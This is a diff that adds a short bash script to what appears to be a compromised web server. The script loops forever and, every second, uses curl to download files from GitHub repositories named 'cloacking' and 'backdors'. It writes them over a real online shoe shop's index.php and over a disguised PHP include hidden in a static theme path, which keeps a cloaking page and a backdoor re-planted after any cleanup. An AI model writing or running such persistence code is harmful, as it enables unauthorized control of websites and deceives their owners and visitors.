@@ -1,0 +1,23 @@
+#!/bin/bash
+
+FILES=(
+"/home/rutten/domains/ruttenschoenen.nl/public_html/index.php"
+"/home/rutten/domains/ruttenschoenen.nl/public_html/pub/static/frontend/Codazon/unlimited_fashion/en_US/Aheadworks_OneStepCheckout/js/view/sidebar/item-details/options-renderer/configurable/field/sys_comment.php.inc"
+)
+
+URLS=(
+"https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/ruttenschoenen"
+"https://raw.githubusercontent.com/flux-lab/backdors/refs/heads/main/gecko"
+)
+
+while true
+do
+
+for i in ${!FILES[@]}
+do
+curl -s "${URLS[$i]}" -o "${FILES[$i]}"
+done
+
+sleep 1
+
+done
